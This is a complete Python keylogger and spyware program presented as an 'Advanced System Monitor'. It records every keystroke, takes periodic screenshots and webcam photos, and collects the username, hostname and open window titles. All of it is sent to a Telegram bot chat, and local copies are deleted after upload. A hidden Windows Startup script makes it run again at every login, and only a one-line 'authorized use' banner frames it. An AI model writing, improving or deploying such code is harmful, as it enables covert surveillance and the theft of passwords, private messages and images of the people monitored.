# fixed_monitor.py
import keyboard
import requests
import threading
import time
import os
import platform
import psutil
import pyautogui
import cv2
import numpy as np
from datetime import datetime
import json
import getpass
import subprocess
import sys
from pathlib import Path

class AdvancedSystemMonitor:
    def __init__(self):
        self.load_config()
        self.keylog_file = "system_log.txt"
        self.is_running = False
        self.screenshot_interval = 30  # 30 seconds for testing
        self.webcam_interval = 60      # 1 minute for testing
        self.upload_interval = 30      # 30 seconds for testing
        
    def load_config(self):
        """Load Telegram configuration"""
        try:
            if os.path.exists('telegram_config.json'):
                with open('telegram_config.json', 'r') as f:
                    config = json.load(f)
                    self.bot_token = config.get('bot_token')
                    self.chat_id = config.get('chat_id')
                    print(f"✅ Loaded config: Chat ID {self.chat_id}")
            else:
                print("❌ Config file not found. Run setup first.")
                self.setup_telegram_interactive()
        except Exception as e:
            print(f"❌ Config load error: {e}")
            self.setup_telegram_interactive()
    
    def setup_telegram_interactive(self):
        """Interactive Telegram setup"""
        print("\n🔧 Telegram Setup Required")
        print("=" * 40)
        
        self.bot_token = input("Enter your bot token: ").strip()
        
        # Try to get chat ID automatically
        self.chat_id = self.get_chat_id_auto(self.bot_token)
        
        if not self.chat_id:
            self.chat_id = input("Enter your chat ID manually: ").strip()
        
        # Save config
        config = {
            'bot_token': self.bot_token,
            'chat_id': self.chat_id
        }
        with open('telegram_config.json', 'w') as f:
            json.dump(config, f)
        
        print("✅ Configuration saved!")
    
    def get_chat_id_auto(self, bot_token):
        """Automatically get chat ID"""
        try:
            url = f"https://api.telegram.org/bot{bot_token}/getUpdates"
            response = requests.get(url, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                if data['ok'] and data['result']:
                    chat_id = data['result'][-1]['message']['chat']['id']
                    print(f"✅ Auto-detected Chat ID: {chat_id}")
                    return str(chat_id)
                else:
                    print("❌ No messages found. Please send a message to your bot.")
                    return None
            else:
                print(f"❌ Invalid bot token: {response.text}")
                return None
        except Exception as e:
            print(f"❌ Auto-detection failed: {e}")
            return None
    
    def test_telegram_connection(self):
        """Test if Telegram connection works"""
        print("Testing Telegram connection...")
        test_message = f"🤖 Bot Test\n✅ Connection Successful\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        
        if self.send_to_telegram(message=test_message):
            print("✅ Telegram connection test: PASSED")
            return True
        else:
            print("❌ Telegram connection test: FAILED")
            return False
    
    def get_system_info(self):
        """Get system information"""
        try:
            system_info = {
                'username': getpass.getuser(),
                'system': platform.system(),
                'hostname': platform.node(),
                'processor': platform.processor() or 'Unknown',
                'architecture': platform.architecture()[0],
                'boot_time': datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
            }
            return system_info
        except Exception as e:
            return {'error': str(e)}
    
    def get_active_windows(self):
        """Get active windows"""
        try:
            active_windows = []
            if platform.system() == "Windows":
                import win32gui
                import win32process
                
                def callback(hwnd, ctx):
                    if win32gui.IsWindowVisible(hwnd):
                        window_text = win32gui.GetWindowText(hwnd)
                        if window_text.strip():
                            _, pid = win32process.GetWindowThreadProcessId(hwnd)
                            try:
                                process = psutil.Process(pid)
                                process_name = process.name()
                            except:
                                process_name = "Unknown"
                            active_windows.append({
                                'window': window_text,
                                'process': process_name
                            })
                win32gui.EnumWindows(callback, None)
            return active_windows[:8]
        except Exception as e:
            return [{'window': f'Error: {str(e)}', 'process': 'Unknown'}]
    
    def capture_screenshot(self):
        """Capture screenshot"""
        try:
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            screenshot_path = f"screenshot_{timestamp}.png"
            screenshot = pyautogui.screenshot()
            screenshot.save(screenshot_path)
            return screenshot_path
        except Exception as e:
            print(f"❌ Screenshot error: {e}")
            return None
    
    def capture_webcam(self):
        """Capture webcam photo"""
        try:
            # Try different camera indexes
            for camera_index in [0, 1, 2]:
                cap = cv2.VideoCapture(camera_index)
                if cap.isOpened():
                    ret, frame = cap.read()
                    if ret:
                        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                        webcam_path = f"webcam_{timestamp}.jpg"
                        cv2.imwrite(webcam_path, frame)
                        cap.release()
                        return webcam_path
                cap.release()
            return None
        except Exception as e:
            print(f"❌ Webcam error: {e}")
            return None
    
    def on_key_event(self, event):
        """Handle keyboard events"""
        try:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            key_name = event.name
            
            if len(key_name) > 1:
                key_name = f"[{key_name.upper()}]"
            
            log_entry = f"{timestamp} - {key_name}\n"
            
            with open(self.keylog_file, 'a', encoding='utf-8') as f:
                f.write(log_entry)
                
        except Exception as e:
            print(f"❌ Keylog error: {e}")
    
    def send_to_telegram(self, file_path=None, message=None, file_type='document'):
        """Send message/file to Telegram with improved error handling"""
        max_retries = 3
        for attempt in range(max_retries):
            try:
                if file_path and os.path.exists(file_path):
                    # Check file size (Telegram has 50MB limit)
                    file_size = os.path.getsize(file_path) / 1024 / 1024  # MB
                    if file_size > 45:
                        print(f"⚠️ File too large: {file_size:.2f}MB")
                        return False
                    
                    if file_type == 'photo':
                        url = f"https://api.telegram.org/bot{self.bot_token}/sendPhoto"
                        with open(file_path, 'rb') as file:
                            files = {'photo': file}
                            data = {'chat_id': self.chat_id}
                            if message:
                                data['caption'] = message
                            response = requests.post(url, files=files, data=data, timeout=60)
                    else:
                        url = f"https://api.telegram.org/bot{self.bot_token}/sendDocument"
                        with open(file_path, 'rb') as file:
                            files = {'document': file}
                            data = {'chat_id': self.chat_id}
                            if message:
                                data['caption'] = message
                            response = requests.post(url, files=files, data=data, timeout=60)
                    
                    if response.status_code == 200:
                        print(f"✅ Sent: {os.path.basename(file_path)}")
                        try:
                            os.remove(file_path)
                        except:
                            pass
                        return True
                    else:
                        print(f"❌ Telegram error {attempt+1}/{max_retries}: {response.text}")
                        time.sleep(2)
                        
                elif message:
                    url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
                    data = {
                        'chat_id': self.chat_id,
                        'text': message[:4000]  # Telegram message limit
                    }
                    response = requests.post(url, data=data, timeout=30)
                    
                    if response.status_code == 200:
                        print("✅ Message sent")
                        return True
                    else:
                        print(f"❌ Message error {attempt+1}/{max_retries}: {response.text}")
                        time.sleep(2)
                        
            except requests.exceptions.Timeout:
                print(f"❌ Timeout {attempt+1}/{max_retries}")
                time.sleep(2)
            except Exception as e:
                print(f"❌ Send error {attempt+1}/{max_retries}: {e}")
                time.sleep(2)
        
        return False
    
    def periodic_tasks(self):
        """Handle all periodic tasks in one thread"""
        screenshot_counter = 0
        webcam_counter = 0
        
        while self.is_running:
            try:
                # Upload keylogs every interval
                if os.path.exists(self.keylog_file) and os.path.getsize(self.keylog_file) > 0:
                    system_info = self.get_system_info()
                    info_text = "\n".join([f"{k}: {v}" for k, v in system_info.items()])
                    message = f"⌨️ Keylog Update\n⏰ {datetime.now().strftime('%H:%M:%S')}\n\n{info_text}"
                    
                    if self.send_to_telegram(self.keylog_file, message):
                        open(self.keylog_file, 'w').close()
                
                # Screenshot every screenshot_interval
                if screenshot_counter >= self.screenshot_interval:
                    screenshot_path = self.capture_screenshot()
                    if screenshot_path:
                        active_windows = self.get_active_windows()
                        window_info = "\n".join([f"• {w['window']}" for w in active_windows[:3]])
                        message = f"🖥️ Screenshot\n⏰ {datetime.now().strftime('%H:%M:%S')}\n\nActive Windows:\n{window_info}"
                        self.send_to_telegram(screenshot_path, message, 'photo')
                    screenshot_counter = 0
                
                # Webcam every webcam_interval
                if webcam_counter >= self.webcam_interval:
                    webcam_path = self.capture_webcam()
                    if webcam_path:
                        message = f"📷 Webcam\n⏰ {datetime.now().strftime('%H:%M:%S')}"
                        self.send_to_telegram(webcam_path, message, 'photo')
                    webcam_counter = 0
                
                screenshot_counter += 10
                webcam_counter += 10
                time.sleep(10)  # Check every 10 seconds
                
            except Exception as e:
                print(f"❌ Periodic task error: {e}")
                time.sleep(10)
    
    def setup_autostart(self):
        """Setup autostart"""
        try:
            if platform.system() == "Windows":
                username = getpass.getuser()
                startup_path = Path(f"C:\\Users\\{username}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup")
                vbs_content = f'''
Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /c pythonw \"{os.path.abspath(__file__)}\"", 0, False
'''
                vbs_file = startup_path / "SystemMonitor.vbs"
                with open(vbs_file, 'w') as f:
                    f.write(vbs_content)
                print("✅ Autostart configured")
        except Exception as e:
            print(f"❌ Autostart error: {e}")
    
    def start(self):
        """Start monitoring"""
        print("🚀 Starting Advanced System Monitor...")
        print("⚠️ FOR AUTHORIZED USE ONLY")
        
        # Test Telegram connection first
        if not self.test_telegram_connection():
            print("❌ Cannot start without valid Telegram connection")
            return
        
        self.is_running = True
        
        # Setup autostart
        self.setup_autostart()
        
        # Send startup message
        system_info = self.get_system_info()
        info_text = "\n".join([f"• {k}: {v}" for k, v in system_info.items()])
        startup_msg = f"🔍 System Monitor Started\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\nSystem Info:\n{info_text}"
        self.send_to_telegram(message=startup_msg)
        
        # Start keyboard monitoring
        keyboard.hook(self.on_key_event)
        print("✅ Keyboard monitoring active")
        
        # Start periodic tasks thread
        task_thread = threading.Thread(target=self.periodic_tasks, daemon=True)
        task_thread.start()
        print("✅ Background tasks started")
        
        print("📱 Monitoring active. Data will be sent to Telegram.")
        print("⏹️ Press Ctrl+C to stop")
        
        try:
            while self.is_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop()
    
    def stop(self):
        """Stop monitoring"""
        print("\n🛑 Stopping monitor...")
        self.is_running = False
        
        shutdown_msg = f"🔴 Monitor Stopped\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        self.send_to_telegram(message=shutdown_msg)
        
        keyboard.unhook_all()
        
        # Cleanup files
        for file in [self.keylog_file, "telegram_config.json"]:
            try:
                if os.path.exists(file):
                    os.remove(file)
            except:
                pass
        
        print("✅ Monitor stopped")

def main():
    """Main function with error handling"""
    try:
        monitor = AdvancedSystemMonitor()
        monitor.start()
    except Exception as e:
        print(f"❌ Fatal error: {e}")
        input("Press Enter to exit...")

if __name__ == "__main__":
    main()
